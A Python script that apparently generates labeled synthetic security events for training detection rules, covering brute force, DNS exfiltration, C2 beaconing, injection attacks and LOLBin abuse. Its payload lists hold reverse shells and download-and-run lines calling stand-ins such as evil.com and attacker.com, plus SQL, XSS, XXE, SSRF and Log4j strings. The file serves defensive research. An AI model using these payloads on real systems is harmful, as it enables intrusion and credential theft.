"""
SecOps Autoresearch — Data Preparation
Generates labeled synthetic security events for detection rule optimization.

DO NOT MODIFY THIS FILE. The agent only modifies detect.py.

Usage:
    python prepare.py          # Generate data/events.json
    python prepare.py --stats  # Show dataset statistics
"""

import json
import os
import random
import hashlib
import string
import argparse
from datetime import datetime, timedelta


# ═══ Constants ═══════════════════════════════════════════════════════════════

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
EVENTS_FILE = os.path.join(DATA_DIR, "events.json")
UNLABELED_FILE = os.path.join(DATA_DIR, "events_unlabeled.json")
SEED = 42

# Internal IPs used for simulation
INTERNAL_IPS = [f"10.0.{i}.{j}" for i in range(1, 6) for j in range(10, 30)]
EXTERNAL_IPS = [f"203.0.113.{i}" for i in range(1, 50)] + \
               [f"198.51.100.{i}" for i in range(1, 50)]
BENIGN_DOMAINS = ["google.com", "microsoft.com", "github.com", "slack.com",
                  "zoom.us", "aws.amazon.com", "office365.com", "cdn.cloudflare.com",
                  "analytics.googleapis.com", "update.microsoft.com"]
USERS = [f"user{i}" for i in range(1, 20)] + ["admin", "svc_backup", "svc_deploy"]
MALICIOUS_DOMAINS = ["evil-c2.xyz", "data-drop.cc", "exfil-dns.ru",
                     "malware-cdn.tk", "phish-kit.top"]


# ═══ Event Generators ════════════════════════════════════════════════════════

def _ts(base: datetime, offset_minutes: float = 0) -> str:
    """Generate an ISO timestamp."""
    return (base + timedelta(minutes=offset_minutes)).isoformat() + "Z"


def _gen_brute_force(base_time: datetime, rng: random.Random) -> list:
    """T1110 — Brute Force: Rapid failed logins from a single attacker IP."""
    events = []
    attacker = rng.choice(EXTERNAL_IPS)
    target_user = rng.choice(USERS)
    count = rng.randint(8, 30)

    for i in range(count):
        events.append({
            "timestamp": _ts(base_time, i * 0.5),
            "sourcetype": "auth",
            "src_ip": attacker,
            "dest_ip": rng.choice(INTERNAL_IPS),
            "user": target_user,
            "action": "failure",
            "event_type": "authentication",
            "message": f"Failed login attempt for {target_user} from {attacker}",
            "label": "malicious",
            "attack_type": "brute_force",
            "mitre": "T1110"
        })

    # Followed by one success (attacker gets in)
    if rng.random() < 0.4:
        events.append({
            "timestamp": _ts(base_time, count * 0.5 + 1),
            "sourcetype": "auth",
            "src_ip": attacker,
            "dest_ip": rng.choice(INTERNAL_IPS),
            "user": target_user,
            "action": "success",
            "event_type": "authentication",
            "message": f"Successful login for {target_user} from {attacker} after failures",
            "label": "malicious",
            "attack_type": "brute_force",
            "mitre": "T1110"
        })

    return events


def _gen_dns_exfiltration(base_time: datetime, rng: random.Random) -> list:
    """T1048.003 — DNS Exfiltration: Long encoded DNS queries."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    base_domain = rng.choice(MALICIOUS_DOMAINS)
    count = rng.randint(10, 25)

    for i in range(count):
        # Generate long subdomain with base64-like encoding
        encoded = ''.join(rng.choices(string.ascii_lowercase + string.digits, k=rng.randint(40, 80)))
        query = f"{encoded}.{base_domain}"
        events.append({
            "timestamp": _ts(base_time, i * 2),
            "sourcetype": "dns",
            "src_ip": src,
            "dest_ip": "8.8.8.8",
            "query": query,
            "query_length": len(query),
            "query_type": "TXT",
            "event_type": "dns",
            "message": f"DNS query: {query[:60]}...",
            "label": "malicious",
            "attack_type": "dns_exfiltration",
            "mitre": "T1048.003"
        })

    return events


def _gen_c2_beaconing(base_time: datetime, rng: random.Random) -> list:
    """T1071 — C2 Beaconing: Periodic outbound connections."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    c2_ip = rng.choice(EXTERNAL_IPS)
    interval = rng.choice([60, 120, 300])  # seconds
    jitter = rng.uniform(0.05, 0.15)
    beacon_count = rng.randint(20, 60)

    for i in range(beacon_count):
        actual_interval = interval + rng.uniform(-interval * jitter, interval * jitter)
        events.append({
            "timestamp": _ts(base_time, i * (actual_interval / 60)),
            "sourcetype": "firewall",
            "src_ip": src,
            "dest_ip": c2_ip,
            "dest_port": rng.choice([443, 8443, 8080, 4444]),
            "action": "allowed",
            "direction": "outbound",
            "bytes_out": rng.randint(100, 500),
            "bytes_in": rng.randint(50, 200),
            "event_type": "network",
            "message": f"Outbound connection {src} -> {c2_ip}",
            "label": "malicious",
            "attack_type": "c2_beaconing",
            "mitre": "T1071"
        })

    return events


def _gen_lateral_movement(base_time: datetime, rng: random.Random) -> list:
    """T1021.002 — Lateral Movement via SMB."""
    events = []
    attacker = rng.choice(INTERNAL_IPS)
    targets = rng.sample([ip for ip in INTERNAL_IPS if ip != attacker], k=rng.randint(4, 8))

    for i, target in enumerate(targets):
        events.append({
            "timestamp": _ts(base_time, i * 3),
            "sourcetype": "firewall",
            "src_ip": attacker,
            "dest_ip": target,
            "dest_port": 445,
            "action": "allowed",
            "direction": "internal",
            "bytes_out": rng.randint(1000, 50000),
            "event_type": "network",
            "message": f"SMB connection {attacker} -> {target}:445",
            "label": "malicious",
            "attack_type": "lateral_movement",
            "mitre": "T1021.002"
        })

    return events


def _gen_powershell_abuse(base_time: datetime, rng: random.Random) -> list:
    """T1059.001 — Suspicious PowerShell execution."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    user = rng.choice(USERS)

    payloads = [
        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        "pwsh -ExecutionPolicy Bypass -File payload.ps1",
        "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString",
        "powershell -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA",
        "powershell Invoke-Mimikatz -DumpCreds",
    ]

    cmd = rng.choice(payloads)
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "sysmon",
        "src_ip": src,
        "user": user,
        "process": "powershell.exe",
        "command_line": cmd,
        "parent_process": rng.choice(["cmd.exe", "explorer.exe", "wmiprvse.exe", "svchost.exe"]),
        "event_type": "process",
        "message": f"PowerShell execution: {cmd[:50]}...",
        "label": "malicious",
        "attack_type": "powershell_abuse",
        "mitre": "T1059.001"
    })

    return events


def _gen_privilege_escalation(base_time: datetime, rng: random.Random) -> list:
    """T1068 — Privilege Escalation."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    user = rng.choice([u for u in USERS if u != "admin" and not u.startswith("svc_")])

    commands = [
        f"sudo su - root",
        f"sudo /bin/bash",
        f"runas /user:admin cmd.exe",
        f"pkexec /bin/sh",
        f"sudo -l",
    ]

    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "auth",
        "src_ip": src,
        "user": user,
        "action": "escalation",
        "command": rng.choice(commands),
        "event_type": "authentication",
        "message": f"Privilege escalation attempt by {user}",
        "label": "malicious",
        "attack_type": "privilege_escalation",
        "mitre": "T1068"
    })

    return events


def _gen_sql_injection(base_time: datetime, rng: random.Random) -> list:
    """T1190 — SQL Injection attacks via HTTP requests."""
    events = []
    src = rng.choice(EXTERNAL_IPS)
    target = rng.choice(INTERNAL_IPS)
    
    sqli_payloads = [
        "id=1' OR '1'='1",
        "user=admin'--",
        "search=' UNION SELECT username,password FROM users--",
        "cat=1' AND 1=1--",
        "login=' OR '1'='1'--",
        "page=1' ORDER BY 10--",
        "id=1' AND SLEEP(5)--",
        "user=admin' UNION SELECT * FROM information_schema.tables--",
        "cmd=1'; DROP TABLE users;--",
        "search=1' OR 1=1 LIMIT 1--",
    ]
    
    endpoints = ["/login", "/search", "/api/users", "/product", "/admin/query"]
    
    payload = rng.choice(sqli_payloads)
    endpoint = rng.choice(endpoints)
    url = f"http://app.internal{endpoint}?{payload}"
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": target,
        "dest_port": 80,
        "url": url,
        "request": f"GET {endpoint}?{payload} HTTP/1.1",
        "body": "",
        "method": "GET",
        "user_agent": rng.choice(["sqlmap/1.0", "Mozilla/5.0", "curl/7.68.0"]),
        "event_type": "http",
        "message": f"SQL Injection attempt: {payload[:40]}...",
        "label": "malicious",
        "attack_type": "sql_injection",
        "mitre": "T1190"
    })

    return events


def _gen_rce_attack(base_time: datetime, rng: random.Random) -> list:
    """T1059/T1203 — Remote Code Execution via HTTP/command injection."""
    events = []
    src = rng.choice(EXTERNAL_IPS)
    target = rng.choice(INTERNAL_IPS)
    
    rce_payloads = [
        {"cmd": "; whoami", "body": "cmd=;whoami"},
        {"cmd": "| nc -e /bin/sh 192.168.1.100 4444", "body": "host=|nc+-e+/bin/sh+attacker.com+4444"},
        {"cmd": "`curl http://evil.com/shell.sh | bash`", "body": "name=`curl+http://evil.com/shell.sh+|+bash`"},
        {"cmd": "$(python -c 'import socket,subprocess,os')", "body": "input=$(python+-c+'import+socket')"},
        {"cmd": "; bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "body": "cmd=;bash+-i+>%26+/dev/tcp/attacker.com/4444"},
        {"cmd": "| python -c 'import socket,subprocess,os;s=socket.socket();s.connect(())'", "body": "data=|python+-c+'import+socket'"},
        {"cmd": "; eval(base64_decode('c3lzdGVtKCJ3aG9hbWkiKTs='))", "body": "code=;eval(base64_decode(...))"},
        {"cmd": "| perl -e 'use Socket;$i=\"1.2.3.4\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))'", "body": "param=|perl+-e+'use+Socket'"},
    ]
    
    endpoints = ["/api/run", "/cgi-bin/exec", "/admin/debug", "/test/cmd", "/tools/ping"]
    
    payload = rng.choice(rce_payloads)
    endpoint = rng.choice(endpoints)
    url = f"http://app.internal{endpoint}"
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": target,
        "dest_port": 80,
        "url": url,
        "request": f"POST {endpoint} HTTP/1.1",
        "body": payload["body"],
        "command": payload["cmd"],
        "method": "POST",
        "user_agent": "Mozilla/5.0",
        "event_type": "http",
        "message": f"RCE attempt: {payload['cmd'][:40]}...",
        "label": "malicious",
        "attack_type": "rce",
        "mitre": "T1059"
    })

    return events


def _gen_xss_attack(base_time: datetime, rng: random.Random) -> list:
    """T1189 — Cross-Site Scripting (XSS) attacks."""
    events = []
    src = rng.choice(EXTERNAL_IPS)
    target = rng.choice(INTERNAL_IPS)
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert('XSS')",
        "<svg onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert(1)>",
        "'><script>document.location='http://evil.com?c='+document.cookie</script>",
        "<input type=text onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ]
    
    fields = ["comment", "name", "search", "email", "message", "bio"]
    endpoints = ["/post", "/profile", "/search", "/contact", "/feedback"]
    
    payload = rng.choice(xss_payloads)
    field = rng.choice(fields)
    endpoint = rng.choice(endpoints)
    url = f"http://app.internal{endpoint}"
    body = f"{field}={payload}"
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": target,
        "dest_port": 80,
        "url": url,
        "request": f"POST {endpoint} HTTP/1.1",
        "body": body,
        "method": "POST",
        "user_agent": rng.choice(["Mozilla/5.0", "<script>alert(1)</script>"]),
        "event_type": "http",
        "message": f"XSS attempt in {field}: {payload[:35]}...",
        "label": "malicious",
        "attack_type": "xss",
        "mitre": "T1189"
    })

    return events


def _gen_path_traversal(base_time: datetime, rng: random.Random) -> list:
    """T1083 — Path Traversal / Local File Inclusion attacks."""
    events = []
    src = rng.choice(EXTERNAL_IPS)
    target = rng.choice(INTERNAL_IPS)
    
    traversal_payloads = [
        "../../../etc/passwd",
        "../../windows/system32/config/sam",
        "....//....//etc/shadow",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "../../../proc/self/environ",
        "../../boot.ini",
        "../../../var/log/apache2/access.log",
        "..\\..\\..\\windows\\win.ini",
        "....\\....\\....\\windows\\system.ini",
    ]
    
    endpoints = ["/download", "/view", "/file", "/api/document", "/static", "/resource"]
    params = ["file", "path", "doc", "filename", "resource", "page"]
    
    payload = rng.choice(traversal_payloads)
    endpoint = rng.choice(endpoints)
    param = rng.choice(params)
    url = f"http://app.internal{endpoint}?{param}={payload}"
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": target,
        "dest_port": 80,
        "url": url,
        "request": f"GET {endpoint}?{param}={payload} HTTP/1.1",
        "body": "",
        "filepath": payload,
        "method": "GET",
        "user_agent": rng.choice(["Mozilla/5.0", "curl/7.68.0", "sqlmap/1.0"]),
        "event_type": "http",
        "message": f"Path traversal attempt: {payload[:40]}...",
        "label": "malicious",
        "attack_type": "path_traversal",
        "mitre": "T1083"
    })

    return events


def _gen_ldap_injection(base_time: datetime, rng: random.Random) -> list:
    """T1213 — LDAP Injection attacks."""
    events = []
    src = rng.choice(EXTERNAL_IPS)
    target = rng.choice(INTERNAL_IPS)
    
    ldap_payloads = [
        "*)(uid=*",           # Wildcard search
        "*)(objectClass=*",   # All objects
        "admin)(|(password=*", # OR injection
        "*)(uid=*))(&(uid=*", # Complex bypass
        "*))(&(objectClass=*", # Comment injection
        "admin*",             # Wildcard at end
        ")(sn=*",             # Opening bracket injection
        "*)(|&(objectClass=person", # Boolean AND
        "cn=admin)(&()",     # Empty AND
        "(uid=*))(|(uid=*",   # Nested query
    ]
    
    endpoints = ["/ldap/search", "/api/users", "/auth/ldap", "/directory/query"]
    params = ["filter", "query", "dn", "search", "user"]
    
    payload = rng.choice(ldap_payloads)
    endpoint = rng.choice(endpoints)
    param = rng.choice(params)
    url = f"http://app.internal{endpoint}?{param}={payload}"
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": target,
        "dest_port": 80,
        "url": url,
        "request": f"GET {endpoint}?{param}={payload} HTTP/1.1",
        "body": f"{param}={payload}",
        "method": "GET",
        "user_agent": "Mozilla/5.0",
        "event_type": "http",
        "message": f"LDAP injection: {payload[:40]}...",
        "label": "malicious",
        "attack_type": "ldap_injection",
        "mitre": "T1213"
    })

    return events


def _gen_command_injection(base_time: datetime, rng: random.Random) -> list:
    """T1059 — Command Injection attacks."""
    events = []
    src = rng.choice(EXTERNAL_IPS)
    target = rng.choice(INTERNAL_IPS)
    
    cmd_payloads = [
        {"sep": ";", "cmd": "cat /etc/passwd"},
        {"sep": "|", "cmd": "whoami"},
        {"sep": "\u0026\u0026", "cmd": "id"},
        {"sep": "`", "cmd": "uname -a"},
        {"sep": "$(", "cmd": "ls -la"},
        {"sep": ";", "cmd": "curl http://evil.com/exfil"},
        {"sep": "|", "cmd": "nc -e /bin/sh 1.2.3.4 4444"},
        {"sep": ";", "cmd": "wget -O- http://attacker.com/shell.sh | bash"},
        {"sep": "\u0026", "cmd": "python -c 'import socket,subprocess,os'"},
        {"sep": ";", "cmd": "powershell IEX(New-Object Net.WebClient).DownloadString"},
    ]
    
    endpoints = ["/api/exec", "/ping", "/tools/dig", "/debug/command", "/test/system"]
    params = ["host", "domain", "cmd", "command", "exec", "input"]
    
    payload = rng.choice(cmd_payloads)
    endpoint = rng.choice(endpoints)
    param = rng.choice(params)
    full_cmd = f"{payload['sep']}{payload['cmd']}"
    url = f"http://app.internal{endpoint}?{param}=example.com{full_cmd}"
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": target,
        "dest_port": 80,
        "url": url,
        "request": f"GET {endpoint}?{param}=example.com{full_cmd} HTTP/1.1",
        "body": "",
        "command": full_cmd,
        "method": "GET",
        "user_agent": "Mozilla/5.0",
        "event_type": "http",
        "message": f"Command injection: {full_cmd[:40]}...",
        "label": "malicious",
        "attack_type": "command_injection",
        "mitre": "T1059"
    })

    return events


def _gen_xxe_attack(base_time: datetime, rng: random.Random) -> list:
    """T1059 — XML External Entity (XXE) attacks."""
    events = []
    src = rng.choice(EXTERNAL_IPS)
    target = rng.choice(INTERNAL_IPS)
    
    xxe_payloads = [
        '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
        '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>''',
        '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]><test>&xxe;</test>''',
        '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///proc/self/environ">%xxe;]>''',
        '''<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>''',
        '''<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>''',
        '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>''',
        '''<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>''',
    ]
    
    endpoints = ["/api/xml", "/soap", "/upload/xml", "/import", "/process"]
    
    payload = rng.choice(xxe_payloads)
    endpoint = rng.choice(endpoints)
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": target,
        "dest_port": 80,
        "url": f"http://app.internal{endpoint}",
        "request": f"POST {endpoint} HTTP/1.1",
        "body": payload,
        "method": "POST",
        "content_type": "application/xml",
        "user_agent": "Mozilla/5.0",
        "event_type": "http",
        "message": f"XXE attempt: {payload[:50]}...",
        "label": "malicious",
        "attack_type": "xxe",
        "mitre": "T1059"
    })

    return events


def _gen_ssrf_attack(base_time: datetime, rng: random.Random) -> list:
    """T1189 — Server-Side Request Forgery (SSRF) attacks."""
    events = []
    src = rng.choice(EXTERNAL_IPS)
    target = rng.choice(INTERNAL_IPS)
    
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://169.254.169.254/metadata/v1/",       # DigitalOcean
        "http://metadata.google.internal/",          # GCP metadata
        "http://10.0.0.1/admin",                     # Internal IP
        "http://192.168.1.1/config",                 # Router config
        "http://127.0.0.1:22/",                      # Local SSH
        "http://0.0.0.0:8080/api",                   # All interfaces
        "http://[::ffff:169.254.169.254]/",          # IPv6 bypass
        "file:///etc/passwd",                        # File protocol
        "dict://127.0.0.1:6379/info",                # Redis
        "gopher://127.0.0.1:9000/",                  # PHP-FPM
        "ftp://anonymous@10.0.0.5:21/",              # Internal FTP
    ]
    
    endpoints = ["/api/fetch", "/proxy", "/webhook", "/import", "/preview"]
    params = ["url", "target", "endpoint", "uri", "resource"]
    
    payload = rng.choice(ssrf_payloads)
    endpoint = rng.choice(endpoints)
    param = rng.choice(params)
    url = f"http://app.internal{endpoint}?{param}={payload.replace('/', '%2F')}"
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": target,
        "dest_port": 80,
        "url": url,
        "request": f"GET {endpoint}?{param}={payload} HTTP/1.1",
        "body": "",
        "ssrf_target": payload,
        "method": "GET",
        "user_agent": "Mozilla/5.0",
        "event_type": "http",
        "message": f"SSRF attempt: {payload[:40]}...",
        "label": "malicious",
        "attack_type": "ssrf",
        "mitre": "T1189"
    })

    return events


def _gen_nosql_injection(base_time: datetime, rng: random.Random) -> list:
    """T1190 — NoSQL Injection attacks (MongoDB, etc.)."""
    events = []
    src = rng.choice(EXTERNAL_IPS)
    target = rng.choice(INTERNAL_IPS)
    
    nosql_payloads = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.length > 0"}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$or": [{"username": "admin"}, {"username": {"$ne": null}}]}',
        '{"username": {"$in": ["admin", "root", "user"]}}',
        '{"$and": [{"username": "admin"}, {"$where": "sleep(5000)"}]}',
        '{"username": {"$exists": true}}',
        '{"password": {"$exists": false}}',
    ]
    
    endpoints = ["/api/users", "/auth/login", "/api/query", "/db/search"]
    
    payload = rng.choice(nosql_payloads)
    endpoint = rng.choice(endpoints)
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": target,
        "dest_port": 80,
        "url": f"http://app.internal{endpoint}",
        "request": f"POST {endpoint} HTTP/1.1",
        "body": payload,
        "method": "POST",
        "content_type": "application/json",
        "user_agent": "Mozilla/5.0",
        "event_type": "http",
        "message": f"NoSQL injection: {payload[:40]}...",
        "label": "malicious",
        "attack_type": "nosql_injection",
        "mitre": "T1190"
    })

    return events


def _gen_log4j_attack(base_time: datetime, rng: random.Random) -> list:
    """T1190 — Log4j / JNDI Injection (CVE-2021-44228)."""
    events = []
    src = rng.choice(EXTERNAL_IPS)
    target = rng.choice(INTERNAL_IPS)
    
    log4j_payloads = [
        "${jndi:ldap://attacker.com/a}",
        "${jndi:rmi://attacker.com:1099/exploit}",
        "${jndi:dns://attacker.com}",
        "${jndi:ldap://attacker.com:1389/Exploit}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com}",  # Obfuscated
        "${jndi:ldap://127.0.0.1#attacker.com/a}",  # Bypass
        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com}",
        "${jndi:ldap://attacker.com/Exploit.class}",
        "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com}",
        "${${::-j}ndi:ldap://attacker.com}",
    ]
    
    # JNDI can be injected via any header field
    headers = ["User-Agent", "X-Api-Version", "X-Forwarded-For", "Referer", "Accept", "Cookie"]
    endpoints = ["/api/log", "/", "/api/headers", "/webhook"]
    
    payload = rng.choice(log4j_payloads)
    endpoint = rng.choice(endpoints)
    header_name = rng.choice(headers)
    
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "web",
        "src_ip": src,
        "dest_ip": target,
        "dest_port": 80,
        "url": f"http://app.internal{endpoint}",
        "request": f"GET {endpoint} HTTP/1.1",
        "body": "",
        "headers": {header_name: payload},
        "user_agent": payload if header_name == "User-Agent" else "Mozilla/5.0",
        "method": "GET",
        "event_type": "http",
        "message": f"Log4j JNDI injection in {header_name}: {payload[:40]}...",
        "label": "malicious",
        "attack_type": "log4j",
        "mitre": "T1190"
    })

    return events


# ═══ STEALTHY attack variants (harder to detect) ═════════════════════════════

def _gen_slow_brute_force(base_time: datetime, rng: random.Random) -> list:
    """Low-and-slow brute force: few failures spread over hours."""
    events = []
    attacker = rng.choice(EXTERNAL_IPS)
    target_user = rng.choice(USERS)
    count = rng.randint(3, 4)  # under typical threshold

    for i in range(count):
        events.append({
            "timestamp": _ts(base_time, i * rng.randint(30, 120)),
            "sourcetype": "auth",
            "src_ip": attacker,
            "dest_ip": rng.choice(INTERNAL_IPS),
            "user": target_user,
            "action": "failure",
            "event_type": "authentication",
            "message": f"Failed login for {target_user}",
            "label": "malicious",
            "attack_type": "slow_brute_force",
            "mitre": "T1110"
        })

    return events


def _gen_stealthy_c2(base_time: datetime, rng: random.Random) -> list:
    """C2 with domain fronting — looks like normal HTTPS to known CDN."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    # Uses legitimate-looking dest but with unusual patterns
    fronting_ip = rng.choice(EXTERNAL_IPS)
    count = rng.randint(5, 12)

    for i in range(count):
        events.append({
            "timestamp": _ts(base_time, i * rng.randint(5, 20)),
            "sourcetype": "firewall",
            "src_ip": src,
            "dest_ip": fronting_ip,
            "dest_port": 443,
            "action": "allowed",
            "direction": "outbound",
            "bytes_out": rng.randint(50, 300),
            "bytes_in": rng.randint(50, 150),
            "event_type": "network",
            "message": f"HTTPS connection {src} -> {fronting_ip}:443",
            "label": "malicious",
            "attack_type": "stealthy_c2",
            "mitre": "T1071"
        })

    return events


def _gen_encoded_exfil(base_time: datetime, rng: random.Random) -> list:
    """Exfiltration via DNS with shorter queries that stay under typical thresholds."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    base_domain = rng.choice(MALICIOUS_DOMAINS)
    count = rng.randint(15, 30)

    for i in range(count):
        # Shorter encoded subdomains — under the 50-char threshold
        encoded = ''.join(rng.choices(string.ascii_lowercase + string.digits, k=rng.randint(15, 35)))
        query = f"{encoded}.{base_domain}"
        events.append({
            "timestamp": _ts(base_time, i * 3),
            "sourcetype": "dns",
            "src_ip": src,
            "dest_ip": "8.8.8.8",
            "query": query,
            "query_length": len(query),
            "query_type": "A",
            "event_type": "dns",
            "message": f"DNS query: {query}",
            "label": "malicious",
            "attack_type": "encoded_exfil",
            "mitre": "T1048.003"
        })

    return events


def _gen_fileless_attack(base_time: datetime, rng: random.Random) -> list:
    """Fileless attack using living-off-the-land binaries (LOLBins)."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    user = rng.choice(USERS)

    lolbins = [
        {"process": "mshta.exe", "command_line": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run\")", "parent": "explorer.exe"},
        {"process": "certutil.exe", "command_line": "certutil -urlcache -split -f http://evil.com/payload.exe", "parent": "cmd.exe"},
        {"process": "regsvr32.exe", "command_line": "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll", "parent": "cmd.exe"},
        {"process": "rundll32.exe", "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"", "parent": "explorer.exe"},
        {"process": "wscript.exe", "command_line": "wscript.exe C:\\Users\\Public\\payload.vbs", "parent": "explorer.exe"},
    ]

    lolbin = rng.choice(lolbins)
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "sysmon",
        "src_ip": src,
        "user": user,
        "process": lolbin["process"],
        "command_line": lolbin["command_line"],
        "parent_process": lolbin["parent"],
        "event_type": "process",
        "message": f"{lolbin['process']} execution",
        "label": "malicious",
        "attack_type": "fileless_attack",
        "mitre": "T1218"
    })

    return events


# ═══ NOISY benign events (cause false positives) ═════════════════════════════

def _gen_noisy_auth(base_time: datetime, rng: random.Random) -> list:
    """Legitimate users with occasional failed logins (password typos, expired creds)."""
    events = []
    user = rng.choice(USERS)
    src = rng.choice(INTERNAL_IPS)
    # 2-4 failures followed by success — looks like password typo
    fail_count = rng.randint(2, 4)

    for i in range(fail_count):
        events.append({
            "timestamp": _ts(base_time, i * 0.2),
            "sourcetype": "auth",
            "src_ip": src,
            "dest_ip": rng.choice(INTERNAL_IPS),
            "user": user,
            "action": "failure",
            "event_type": "authentication",
            "message": f"Failed login for {user} (password typo)",
            "label": "benign",
            "attack_type": "none"
        })

    events.append({
        "timestamp": _ts(base_time, fail_count * 0.2 + 0.5),
        "sourcetype": "auth",
        "src_ip": src,
        "dest_ip": rng.choice(INTERNAL_IPS),
        "user": user,
        "action": "success",
        "event_type": "authentication",
        "message": f"Successful login for {user} after typos",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_long_dns_benign(base_time: datetime, rng: random.Random) -> list:
    """Long but benign DNS queries — CDN, analytics, cloud services."""
    events = []
    long_domains = [
        f"us-west-2.ec2.internal.{'x' * rng.randint(30, 50)}.aws.amazon.com",
        f"tracker-{''.join(rng.choices(string.ascii_lowercase, k=40))}.analytics.googleapis.com",
        f"{''.join(rng.choices(string.ascii_lowercase + string.digits, k=35))}.cloudfront.net",
        f"appservice-{''.join(rng.choices(string.hexdigits.lower(), k=32))}.azurewebsites.net",
        f"{''.join(rng.choices(string.ascii_lowercase, k=25))}.update.microsoft.com",
    ]

    query = rng.choice(long_domains)
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "dns",
        "src_ip": rng.choice(INTERNAL_IPS),
        "dest_ip": rng.choice(["8.8.8.8", "1.1.1.1"]),
        "query": query,
        "query_length": len(query),
        "query_type": rng.choice(["A", "AAAA", "CNAME"]),
        "event_type": "dns",
        "message": f"DNS query: {query[:60]}...",
        "label": "benign",
        "attack_type": "none"
    })

    return events


def _gen_admin_smb(base_time: datetime, rng: random.Random) -> list:
    """IT admin doing legitimate SMB connections to multiple servers (patch deployment, etc.)."""
    events = []
    admin_ip = rng.choice(INTERNAL_IPS[:5])  # admins on first subnet
    targets = rng.sample(INTERNAL_IPS[5:], k=rng.randint(4, 10))

    for i, target in enumerate(targets):
        events.append({
            "timestamp": _ts(base_time, i * 5),
            "sourcetype": "firewall",
            "src_ip": admin_ip,
            "dest_ip": target,
            "dest_port": 445,
            "action": "allowed",
            "direction": "internal",
            "bytes_out": rng.randint(5000, 500000),
            "event_type": "network",
            "message": f"SMB admin connection {admin_ip} -> {target}:445",
            "label": "benign",
            "attack_type": "none"
        })

    return events


def _gen_legit_powershell(base_time: datetime, rng: random.Random) -> list:
    """Legitimate PowerShell usage — sysadmin scripts, configuration management."""
    events = []
    src = rng.choice(INTERNAL_IPS)
    user = rng.choice(["admin", "svc_deploy", "svc_backup"])

    legit_commands = [
        "powershell Get-Service | Where-Object {$_.Status -eq 'Running'}",
        "powershell -File C:\\Scripts\\backup.ps1",
        "pwsh -Command Get-Process | Sort-Object CPU -Descending",
        "powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser",
        "powershell Import-Module ActiveDirectory; Get-ADUser -Filter *",
    ]

    cmd = rng.choice(legit_commands)
    events.append({
        "timestamp": _ts(base_time),
        "sourcetype": "sysmon",
        "src_ip": src,
        "user": user,
        "process": rng.choice(["powershell.exe", "pwsh.exe"]),
        "command_line": cmd,
        "parent_process": rng.choice(["explorer.exe", "services.exe", "svchost.exe"]),
        "event_type": "process",
        "message": f"PowerShell: {cmd[:50]}...",
        "label": "benign",
        "attack_type": "none"
    })

    return events


